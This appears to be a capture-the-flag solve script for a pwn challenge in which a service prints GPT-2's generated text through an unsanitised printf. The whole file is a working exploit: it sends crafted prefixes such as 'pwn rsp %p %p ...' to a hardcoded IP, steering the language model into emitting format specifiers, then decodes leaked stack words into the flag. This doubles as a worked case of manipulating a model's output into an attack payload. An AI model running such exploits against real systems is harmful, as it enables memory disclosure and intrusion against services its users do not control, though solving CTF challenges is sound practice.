#!/usr/bin/env python3
"""
ThoughtSlop (pwn, 500) — format-string leak through an LLM's output.

The service (thoughtful.c) runs stock GPT-2 via llama.cpp and prints the
*generated* text with `printf(output_buf);` — a classic format-string bug.
The flag is read into `char flag[48]` on run()'s stack, same frame as the
printf, so making the model slop out `%p` specifiers dumps the stack and the
flag bytes come back as "pointer" values whose hex is pure ASCII.

GPT-2 "corrects" bare `%p` spam into code, but a pwn/debug-flavoured prefix
("pwn rsp %p %p ...") makes it emit a long run of %p. Each socat connection is
a fresh fork, so the sampler (temp 0.7, seed 42) resets and the first
generation is deterministic/reproducible.

Usage:  python3 solve.py [host] [port]
Default host/port target Mirror 1.
"""
import re
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "18.215.143.250"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8888

# Prefixes that reliably push GPT-2 into a sustained %p run. We try a few and
# keep whichever leak yields the complete flag (generation is capped at 128
# new tokens, so the flag qwords must land before the cutoff).
TRIGGERS = [
    "pwn rsp " + "%p " * 22,
    "pwn esp " + "%p " * 26,
    "pwn rsp " + "%p " * 30,
    "exploit rsp " + "%p " * 24,
]

FLAG_RE = re.compile(r"rstcon\{[ -~]*?\}")


def query(payload, wait=16):
    """Open a fresh connection (fork -> seed 42 reset) and return the reply."""
    s = socket.socket()
    s.settimeout(6)
    s.connect((HOST, PORT))
    time.sleep(0.4)
    try:
        s.recv(4096)  # banner
    except OSError:
        pass
    s.sendall(payload.encode()[:124] + b"\n")  # input_buf is 128 bytes
    data = b""
    start = time.time()
    s.settimeout(2)
    while time.time() - start < wait:
        try:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
            if (b"Thinking" in data and data.rstrip().endswith(b">")
                    and len(data) > len(payload) + 30):
                break
        except socket.timeout:
            continue
    s.close()
    return data.decode(errors="replace")


def leaked_ascii(generated):
    """Turn the leaked %p stream into bytes.

    Each `0x...` is one 64-bit stack qword (little-endian); `(nil)` is a NULL
    arg (8 zero bytes). The flag lives in a run of consecutive qwords whose
    bytes are all printable ASCII.
    """
    out = []
    for tok in re.findall(r"0x[0-9a-fA-F]+|\(nil\)", generated):
        if tok == "(nil)":
            out.append("\x00" * 8)
            continue
        h = tok[2:]
        if len(h) % 2:
            h = "0" + h
        out.append(
            "".join(chr(c) if 32 <= c < 127 else "\x00"
                    for c in bytes.fromhex(h)[::-1])
        )
    return "".join(out)


def main():
    for trig in TRIGGERS:
        gen = query(trig).split("Thinking", 1)[-1]
        m = FLAG_RE.search(leaked_ascii(gen))
        if m:
            print("trigger:", repr(trig[:20] + "..."))
            print("FLAG =", m.group(0))
            return
    print("FLAG not recovered — rerun (generation is deterministic per prompt, "
          "try more TRIGGERS).")
    sys.exit(1)


if __name__ == "__main__":
    main()
